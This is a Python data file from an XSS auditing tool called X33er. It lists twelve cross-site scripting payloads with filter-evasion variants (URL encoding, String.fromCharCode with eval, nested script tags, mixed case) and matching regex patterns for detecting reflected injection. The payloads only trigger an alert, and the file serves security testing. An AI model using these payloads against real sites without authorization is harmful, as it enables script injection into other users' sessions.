#!/usr/bin/env python

"""
Copyright (c) 2013 X33er Project
X33er is free software: you can redistribute it and / or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

X33er is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
@for more information see <http://www.gnu.org/licenses/>
"""

######### Payloads For Basic[s] Audit #######

Payloads = {
    "Script Payload with SingleQuotes":"'><script>alert('X33er');</script>",
    "Script Payload with DoubleQuotes":'"><script>alert("X33er");</script>',
    "Script Payload with DoubleQuotes Using URLEncode":'%22%3E%3Cscript%3Ealert%28%27X33er%27%29%3B%3C%2fscript%3E',
    "Script Payload with DoubleQuotes Using String.fromCharCode()":'"><script>alert(String.fromCharCode(88,51,51,101,114));</script>',
    "Script Payload with DoubleQuotes Using Bypass 'alert' word":'"><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,51,51,101,114,39,41));</script>',
    "Script Payload with DoubleQuotes Using Bypass 'alert' word and Non-recursive Script Tag":'"><scr<script>ipt>eval(String.fromCharCode(97,108,101,114,116,40,39,88,51,51,101,114,39,41));</scr</script>ipt>',
    "Script Payload with DoubleQuotes Using basic Obfuscation":'"><ScriPt>alert("X33er");</ScriPt>',
    "Script Payload with SingleQuotes Using URLEncode":'%27%3E%3Cscript%3Ealert%28%27X33er%27%29%3B%3C%2fscript%3E',
    "Script Payload with SingleQuotes Using String.fromCharCode()":'\'><script>alert(String.fromCharCode(88,51,51,101,114));</script>',
    "Script Payload with SingleQuotes Using Bypass 'alert' word":'\'><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,51,51,101,114,39,41));</script>',
    "Script Payload with SingleQuotes Using Bypass 'alert' word and Non-recursive Script Tag":'\'><scr<script>ipt>eval(String.fromCharCode(97,108,101,114,116,40,39,88,51,51,101,114,39,41));</scr</script>ipt>',
    "Script Payload with SingleQuotes Using basic Obfuscation":'\'><ScriPt>alert(\'X33er\');</ScriPt>'
}

PayloadsPCRE = {
    "Script Payload with SingleQuotes":"\'\>\<script\>alert\('X33er'\)\;\<\/script\>",
    "Script Payload with DoubleQuotes":"\"\>\<script\>alert\(\"X33er\"\);\<\/script\>",
    "Script Payload with DoubleQuotes Using URLEncode":"\"\>\<script\>alert\(\'X33er\'\);\<\/script\>",
    "Script Payload with DoubleQuotes Using String.fromCharCode()":"\"\>\<script\>alert\(String\.fromCharCode\(88\,51\,51\,101\,114\)\);\<\/script\>",
    "Script Payload with DoubleQuotes Using Bypass 'alert' word":"\"\>\<script\>eval\(String\.fromCharCode\(97\,108\,101\,114\,116\,40\,39\,88\,51\,51\,101\,114\,39\,41\)\);\<\/script\>",
    "Script Payload with DoubleQuotes Using Bypass 'alert' word and Non-recursive Script Tag":"\"\>\<scr\<script\>ipt\>eval\(String\.fromCharCode\(97\,108\,101\,114\,116\,40\,39\,88\,51\,51\,101\,114\,39\,41\)\);\<\/scr\<\/script\>ipt\>",
    "Script Payload with DoubleQuotes Using basic Obfuscation":"\"\>\<ScriPt\>alert\(\"X33er\"\)\;\<\/ScriPt\>",
    "Script Payload with SingleQuotes Using URLEncode":"\'\>\<script\>alert\(\'X33er\'\);\<\/script\>",
    "Script Payload with SingleQuotes Using String.fromCharCode()":"\'\>\<script\>alert\(String\.fromCharCode\(88\,51\,51\,101\,114\)\);\<\/script\>",
    "Script Payload with SingleQuotes Using Bypass 'alert' word":"\'\>\<script\>eval\(String\.fromCharCode\(97\,108\,101\,114\,116\,40\,39\,88\,51\,51\,101\,114\,39\,41\)\);\<\/script\>",
    "Script Payload with SingleQuotes Using Bypass 'alert' word and Non-recursive Script Tag":"\"\>\<scr\<script\>ipt\>eval\(String\.fromCharCode\(97\,108\,101\,114\,116\,40\,39\,88\,51\,51\,101\,114\,39\,41\)\);\<\/scr\<\/script\>ipt\>",
    "Script Payload with SingleQuotes Using basic Obfuscation":"\'\>\<ScriPt\>alert\(\'X33er\'\)\;\<\/ScriPt\>"
}